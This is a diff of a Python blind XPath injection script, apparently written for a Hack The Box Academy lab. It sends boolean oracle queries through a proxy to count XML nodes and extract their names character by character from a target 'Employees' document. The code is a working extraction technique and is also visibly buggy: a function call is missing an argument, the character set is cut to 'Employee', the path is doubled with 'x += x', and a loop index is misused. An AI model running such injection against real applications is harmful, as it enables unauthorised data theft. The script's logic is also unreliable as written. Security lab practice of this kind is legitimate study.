@@ -5,7 +5,7 @@ from tabulate import tabulate
 
 
 proxies = {
-    "http": "http://10.10.10.200:3128"
+    "http": "http://10.129.120.123:3128"
 }
 
 def oracle(query):
@@ -43,19 +43,18 @@ def dumpNumber(query):
 # Dumping string
 def dumpString(query, length):
     val = ""
-    chars = "aeioutrnsldcmphbgfywkvjxzqAEIOUTRNSLDCMPHBGFYWKVJXZQ0123456789"
+    chars = "Employee"
     for i in range(1, length+1):
         for c in chars:
             if oracle(f"substring({query},{i},1)='{c}'"):
                 val += c
                 print(val)
+                break
     return val
 
 
 func = int(input("""HTB_ACADEMY_ORACLE
 (1) Dump All Datas
-(5) Custom Search (Count or Length)
-(6) Custom Search (Name)
 Your Option : """))
 
 if func == 0:
@@ -64,18 +63,65 @@ if func == 0:
 elif func == 1:
     
     # calc the first node
-    count = 1
-    length = 9
-    x = "name(/*[1])"
-    while 0:
+    d = 3
+    count = 4
+    root_name = "Employees"
+    length = 1
+    val = ""
+    x = "/*[1]"
+
+    # calc the struct deepth
+    while 1:
+        if not (oracle(f"(name({x}))")):
+            print(d)
+            break
+        x += x
+        d += 1
+
+    # dump the root_node, testing root_name = Employees
+    while 1:
         if oracle(f"string-length(name(/*[1]))={length}"):
             break
         length += 1
-    #node_name = dumpString(f"name(/*[1])")
-
+    root_name = dumpString(f"(name(/*[1]))")
+    
+    # Exfiltrating Child Nodes
     while 1:
-        if oracle(f"count(/Employees/*)={count}"):
+        if oracle(f"count(/{root_name}/*)={count}"):
             break
         count += 1
     print(count)
+
+    for i in range(3, count): # child nodes number
+        length = 1
+        while 1:
+            if oracle(f"string-length(name(/*[1]/*[{i}]))={length}"):
+                print(length)
+                break
+            length += 1
+        child_name = dumpString(f"(name(/*[1]/*[{i}]))",length)
+        print(child_name)
+
+    # Exfiltrating Sub Child Nodes
+        while 1:
+            if oracle(f"count(/{root_name}/{child_name}/*)={count}"):
+                break
+            count += 1
+        print(count)
+        
+        for k in range(1, count): # child nodes number
+            length = 1
+            while 1:
+                if oracle(f"string-length(name(/*[1]/*[1]/*[{i}]))={length}"):
+                    print(length)
+                    break
+                length += 1
+            child_name = dumpString(f"(name(/*[1]/*[1]/*[{i}]))",length)
+            print(child_name)
+        print("------next node------")
+
+
+    
+
+
 
